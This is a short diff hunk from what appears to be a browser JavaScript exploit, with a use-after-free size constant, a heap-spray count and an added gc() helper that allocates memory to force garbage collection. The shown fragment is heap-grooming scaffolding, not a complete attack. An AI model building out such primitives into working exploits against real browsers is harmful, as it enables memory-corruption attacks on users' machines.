@@ -11,6 +11,9 @@ import * as config from "./config.mjs";
 const UAF_SIZE = off.size_strimpl + off.size_inline;
 const SPRAY_COUNT = 0x400;
 
+function gc() {
+  new Uint8Array(4 * MB);
+}
 function spray(count, size) {
   const arr = [];
   for (let i = 0; i < count; i++) {
